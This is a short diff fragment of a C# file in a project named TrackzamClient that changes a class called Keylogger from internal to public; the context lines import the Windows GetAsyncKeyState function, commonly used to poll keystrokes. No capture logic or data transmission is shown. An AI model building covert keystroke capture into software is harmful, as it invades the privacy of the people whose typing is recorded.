@@ -8,7 +8,7 @@ using System.Windows.Threading;
 
 namespace TrackzamClient
 {
-    class Keylogger
+    public class Keylogger
     {  
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
